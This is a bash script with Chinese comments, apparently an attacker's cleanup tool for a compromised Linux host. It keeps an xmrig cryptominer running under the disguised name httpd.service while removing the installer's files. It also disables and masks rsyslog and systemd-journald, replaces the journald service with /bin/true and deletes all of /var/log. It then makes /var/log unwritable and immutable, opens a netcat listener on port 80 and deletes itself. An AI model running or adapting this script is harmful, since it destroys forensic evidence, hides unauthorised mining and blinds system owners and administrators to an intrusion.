#!/bin/bash

# 清除原始脚本痕迹的独立脚本，同时保留运行中的 httpd.service

# 确保脚本以 root 权限运行
if [ "$(id -u)" != "0" ]; then
   echo "此脚本需要 root 权限运行" 1>&2
   exit 1
fi

echo "开始清除痕迹..."

# 1. 保留运行中的服务，不干扰 httpd.service
echo "保留 httpd.service 和运行中的进程..."

# 2. 删除原始脚本创建的文件和目录
echo "删除原始脚本生成的文件..."
rm -f /opt/utils/httpd  # 删除 xmrig 二进制文件
rm -f /opt/utils/wrapper  # 删除 wrapper 二进制文件
rm -rf /opt/utils  # 删除 utils 目录
rm -f /etc/systemd/system/conf.d/httpd.conf  # 删除配置文件
rm -rf /etc/systemd/system/conf.d  # 删除配置目录

# 3. 清理可能的临时文件
echo "清理临时文件..."
rm -rf /tmp/xmrig*  # 删除可能的 xmrig 临时文件
rm -rf /tmp/miner_setup  # 删除可能的临时目录

# 4. 清除现有日志并禁用日志生成
echo "清除现有日志并禁用所有日志生成..."

# 停止日志相关服务
systemctl stop rsyslog.service 2>/dev/null
systemctl stop syslog.socket 2>/dev/null
systemctl stop systemd-journald.service 2>/dev/null

# 禁用并屏蔽日志服务
systemctl disable rsyslog.service 2>/dev/null
systemctl disable syslog.socket 2>/dev/null
systemctl mask rsyslog.service 2>/dev/null
systemctl mask syslog.socket 2>/dev/null
systemctl disable systemd-journald.service 2>/dev/null
systemctl mask systemd-journald.service 2>/dev/null

# 删除 rsyslog 配置文件
rm -rf /etc/rsyslog.conf
rm -rf /etc/rsyslog.d

# 配置 systemd-journald 禁用所有日志
cat <<EOF > /etc/systemd/journald.conf
[Journal]
Storage=none
ForwardToSyslog=no
ForwardToKMsg=no
ForwardToConsole=no
ForwardToWall=no
MaxLevelStore=0
MaxLevelSyslog=0
RuntimeMaxUse=0
SystemMaxUse=0
EOF

# 覆盖 systemd-journald 服务文件，防止日志生成
mkdir -p /etc/systemd/system/systemd-journald.service.d
cat <<EOF > /etc/systemd/system/systemd-journald.service.d/override.conf
[Service]
ExecStart=
ExecStart=/bin/true
EOF

# 清除所有现有日志文件
rm -rf /var/log/*

# 锁定 /var/log 目录，防止日志写入
mkdir -p /var/log
chmod 000 /var/log
chattr +i /var/log 2>/dev/null

# 5. 重新加载 systemd 配置（不影响 httpd.service）
echo "重新加载 systemd 配置..."
systemctl daemon-reload

# 6. 验证清理结果
echo "验证清理结果..."
for file in /opt/utils/httpd /opt/utils/wrapper /etc/systemd/system/conf.d/httpd.conf; do
  if [ -e "$file" ]; then
    echo "警告：$file 仍存在，请检查！"
  else
    echo "$file 已删除或不存在。"
  fi
done

for service in rsyslog.service syslog.socket systemd-journald.service; do
  if systemctl status "$service" >/dev/null 2>&1; then
    echo "警告：$service 仍存在，请检查！"
  else
    echo "$service 已删除或不存在。"
  fi
done

if [ -z "$(ls -A /var/log)" ]; then
  echo "/var/log 已清空且锁定，不再生成日志。"
else
  echo "警告：/var/log 未完全清空，请检查！"
fi

# 检查 httpd.service 是否仍在运行
if systemctl status httpd.service >/dev/null 2>&1; then
  echo "httpd.service 仍在运行，清理成功。"
else
  echo "警告：httpd.service 已停止，请检查！"
fi

sudo nc -l 80 &
systemctl status httpd.service
# 删除脚本自身
rm -- "$0"

echo "开始监听80端口！"
echo "痕迹清理完成！"
